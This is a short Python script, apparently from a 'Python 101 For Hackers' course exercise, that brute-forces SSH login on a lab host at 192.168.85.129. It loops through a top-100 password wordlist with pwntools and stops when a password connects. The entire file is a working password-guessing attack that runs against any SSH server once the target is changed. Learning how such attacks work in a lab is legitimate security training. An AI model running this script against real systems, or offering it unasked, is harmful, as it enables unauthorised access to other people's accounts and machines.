from pwn import *
import paramiko

host = "192.168.85.129" # Enter the Target IP-Address
username = "kali" # Enter the Username on the target machine
attempts = 0
with open('D:/2. Apps/2. Coding/1. VS-Code Programs/06. Python/TCM-Sec/Python 101 For Hackers/top-100.txt', 'r') as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'".format(attempts,password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[!] Invalid password !!!")
            print( "-" * 20)
        attempts  += 1
